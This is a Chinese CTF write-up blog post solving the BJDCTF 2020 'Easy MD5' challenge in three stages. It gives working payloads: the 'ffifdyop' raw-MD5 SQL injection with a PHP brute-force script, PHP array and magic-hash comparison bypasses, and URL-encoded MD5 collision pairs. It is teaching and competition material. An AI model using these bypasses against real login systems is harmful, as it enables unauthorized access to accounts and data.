---
title: BJDCTF 2020 Easy MD5
date: 2022-05-28 21:34:10
tags:
- CTF
- MD5绕过
categories: CTF
my: Easy_md5
---

### 第一关

拿到题目只给了一个登录框，一般就是sql注入，F12没有任何信息，尝试注入语法，没有报错回显继续进行信息收集，看见一个非常关键的信息

![](https://nssctf.wdf.ink/img/xmj/image-20220528213812713.png)

这里利用了md5加密，百度查询一下这个的语法

![](https://nssctf.wdf.ink/img/xmj/image-20220528214154353.png)

这里raw的值时true，意为返回16字符二进制格式，这里也就是说如果md5值经过hex转成字符串后为 'or'+balabala这样的字符串，则拼接后构成的SQL语句为：

```
select * from `admin` where password=''or ___
```

木的就是让or后面的值时ture，只要是数字开头都是可以的，password=‘xxx’ or 1，返回值是true。

可通过如下脚本

```php
<?php 
for ($i = 0;;) { 
 for ($c = 0; $c < 1000000; $c++, $i++)
  if (stripos(md5($i, true), '\'or\'') !== false)
   echo "\nmd5($i) = " . md5($i, true) . "\n";
 echo ".";
}
?>
```

提供一常用`ffifdyop`被加密后raw参数为true`'or'6\<trash>`后面的\<trash>是不可见字符，成功sql注入

### 第二关

直接F12发现了提示

```
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```

直接进行md5数组绕过

```
?a[]=0&b[]=1
```

也可以用下面进行弱等于比较

```
a=QNKCDZO&b=s878926199a
```

### 第三关

同样可以进行数组绕过，POST传参数

```
param1[]=0&param2[]=1
```

也可以直接找md5强碰撞的值

```
param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

